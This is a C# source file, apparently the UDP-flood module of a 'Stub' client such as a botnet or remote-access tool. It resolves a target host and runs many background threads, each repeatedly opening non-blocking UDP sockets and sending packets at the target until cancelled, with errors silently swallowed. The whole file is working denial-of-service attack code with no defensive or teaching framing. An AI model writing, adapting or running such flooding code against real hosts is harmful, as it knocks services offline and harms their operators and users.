using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Collections.Generic;

namespace Stub
{
    internal class UdpFlood
    {
        public static string Host;
        public static int Port;
        public static int Threads;
        public static int UdpSockets;
        public static int PacketSize;

        private static IPEndPoint ipEndpoint;
        private static List<Thread> FloodThreads = new List<Thread>();
        private static CancellationTokenSource cancelSource;

        public static void StartUdpFlood()
        {
            try
            {
                ipEndpoint = new IPEndPoint(Dns.GetHostEntry(Host).AddressList[0], Port);
            }
            catch
            {
                ipEndpoint = new IPEndPoint(IPAddress.Parse(Host), Port);
            }

            cancelSource = new CancellationTokenSource();

            for (int i = 0; i < Threads; i++)
            {
                var token = cancelSource.Token;
                Thread t = new Thread(() =>
                {
                    var sender = new UdpSender(ipEndpoint, UdpSockets, PacketSize);
                    sender.Run(token);
                });

                t.IsBackground = true;
                FloodThreads.Add(t);
                t.Start();
            }
        }

        public static void StopUdpFlood()
        {
            if (cancelSource != null)
            {
                cancelSource.Cancel();

                foreach (var t in FloodThreads)
                {
                    try { t.Join(500); } catch { }
                }

                FloodThreads.Clear();
                cancelSource.Dispose();
                cancelSource = null;
            }
        }

        private class UdpSender
        {
            private readonly IPEndPoint target;
            private readonly int socketCount;
            private readonly int packetSize;

            public UdpSender(IPEndPoint target, int socketCount, int packetSize)
            {
                this.target = target;
                this.socketCount = socketCount;
                this.packetSize = packetSize;
            }

            public void Run(CancellationToken token)
            {
                byte[] buffer = new byte[packetSize];

                while (!token.IsCancellationRequested)
                {
                    Socket[] sockets = new Socket[socketCount];

                    try
                    {
                        for (int i = 0; i < socketCount; i++)
                        {
                            sockets[i] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                            sockets[i].Blocking = false;
                            sockets[i].SendTo(buffer, target);
                        }

                        Thread.Sleep(100);
                    }
                    catch
                    {
                        // silent fail
                    }
                    finally
                    {
                        foreach (var sock in sockets)
                        {
                            try { sock?.Close(); } catch { }
                        }
                    }
                }
            }
        }
    }
}
